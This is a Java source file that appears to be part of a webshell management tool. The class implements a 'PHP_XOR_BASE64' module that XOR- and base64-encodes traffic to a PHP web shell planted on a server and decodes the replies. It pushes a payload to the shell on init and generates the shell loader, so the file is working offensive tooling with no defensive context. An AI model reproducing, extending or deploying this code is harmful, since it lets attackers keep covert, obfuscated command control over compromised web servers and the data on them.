package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "PHP_XOR_BASE64", payloadName = "PhpDynamicPayload")
public class PhpXor implements Cryption {
    private String findStrLeft;
    private String findStrRight;
    private Http http;
    private byte[] key;
    private String pass;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override 
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        this.findStrLeft = findStrMd5.substring(0, 16);
        this.findStrRight = findStrMd5.substring(16);
        try {
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public byte[] encode(byte[] data) {
        try {
            return E(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public byte[] decode(byte[] data) {
        if (data == null || data.length <= 0) {
            return data;
        }
        try {
            return D(findStr(data));
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public boolean isSendRLData() {
        return true;
    }

    public byte[] E(byte[] cs) {
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[(i + 1) & 15]);
        }
        return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(cs))).getBytes();
    }

    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[(i + 1) & 15]);
        }
        return cs;
    }

    public String findStr(byte[] respResult) {
        return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
    }

    @Override 
    public boolean check() {
        return this.state;
    }

    @Override 
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}
